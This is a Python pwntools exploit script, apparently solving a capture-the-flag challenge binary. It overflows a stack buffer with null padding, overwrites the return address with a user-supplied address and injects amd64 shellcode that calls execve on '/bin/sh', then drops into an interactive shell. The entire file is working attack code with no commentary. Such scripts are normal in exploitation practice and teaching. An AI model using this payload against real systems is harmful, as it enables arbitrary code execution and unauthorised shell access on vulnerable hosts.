from pwn import *
import argparse

chal = ELF('./chal_patched')
libc = ELF('../glibc/2.42/libc.so.6')

gdbscript='''
b main
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

conn = process([chal.path])
#conn = gdb.debug([chal.path], gdbscript)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("addr_shellcode", help="address to write the shellcode")
    args = parser.parse_args()

    addr_shellcode = int(args.addr_shellcode, 16)
    shellcode = asm('''
        .intel_syntax noprefix
        .global _start
    _start:
        xor rdx, rdx
        push rdx
        mov rax, 0x68732f6e69622f
        push rax 
        mov rdi, rsp
        push rdx
        push rdi 
        mov rsi, rsp 
        mov rax, 0x3b
        syscall
    ''', arch = 'amd64')

    payload = b'\0' * 0x20
    payload += p64(0)
    payload += p64(addr_shellcode)
    payload += shellcode
    
    conn.sendlineafter(b'Input: ', payload)
    conn.interactive()

if __name__ == '__main__':
    main()
